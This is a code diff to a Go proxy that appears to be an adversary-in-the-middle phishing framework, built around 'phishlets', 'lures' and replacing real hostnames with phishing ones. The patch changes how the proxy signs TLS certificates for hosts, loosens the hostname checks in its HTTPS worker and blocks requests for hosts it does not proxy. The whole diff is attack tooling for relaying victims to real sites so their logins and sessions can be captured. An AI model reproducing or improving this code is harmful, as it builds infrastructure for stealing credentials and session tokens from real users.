@@ -198,7 +198,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								vv = uv.Get(p.cfg.verificationParam)
 							}
 							if l != nil || vv == p.cfg.verificationToken {
-
 								// check if lure user-agent filter is triggered
 								if l != nil {
 									if len(l.UserAgentFilter) > 0 {
@@ -584,6 +583,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 				}
 				p.cantFindMe(req, e_host)
+			} else {
+				log.Debug("host not proxied: %s", req.Host)
+				return p.blockRequest(req)
 			}
 
 			return req, nil
@@ -1092,7 +1094,7 @@ func (p *HttpProxy) TLSConfigFromCA() func(host string, ctx *goproxy.ProxyCtx) (
 			// check for lure hostname
 			cert, err := p.crt_db.GetHostnameCertificate(hostname)
 			if err != nil {
-				// check for phishlet hostname
+				// check for phishlet by hostname
 				pl := p.getPhishletByOrigHost(hostname)
 				if pl != nil {
 					phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
@@ -1102,6 +1104,9 @@ func (p *HttpProxy) TLSConfigFromCA() func(host string, ctx *goproxy.ProxyCtx) (
 							return nil, err
 						}
 					}
+				} else {
+					// If hostname has no phishlet, generate self-signed certificate
+					cert, err = p.crt_db.SignCertificateForHost(hostname, "", port)
 				}
 			}
 			if cert != nil {
@@ -1113,18 +1118,14 @@ func (p *HttpProxy) TLSConfigFromCA() func(host string, ctx *goproxy.ProxyCtx) (
 			log.Debug("no SSL/TLS certificate for host '%s'", host)
 			return nil, fmt.Errorf("no SSL/TLS certificate for host '%s'", host)
 		} else {
-			var ok bool
 			phish_host := ""
 			if !p.cfg.IsLureHostnameValid(hostname) {
-				phish_host, ok = p.replaceHostWithPhished(hostname)
-				if !ok {
-					log.Debug("phishing hostname not found: %s", hostname)
-					return nil, fmt.Errorf("phishing hostname not found")
-				}
+				phish_host, _ = p.replaceHostWithPhished(hostname)
 			}
 
 			cert, err := p.crt_db.SignCertificateForHost(hostname, phish_host, port)
 			if err != nil {
+				log.Debug("error signing certificate: %v", err)
 				return nil, err
 			}
 			return &tls.Config{
@@ -1197,13 +1198,7 @@ func (p *HttpProxy) httpsWorker() {
 				return
 			}
 
-			if !p.cfg.IsActiveHostname(hostname) {
-				log.Debug("hostname unsupported: %s", hostname)
-				return
-			}
-
 			hostname, _ = p.replaceHostWithOriginal(hostname)
-
 			req := &http.Request{
 				Method: "CONNECT",
 				URL: &url.URL{
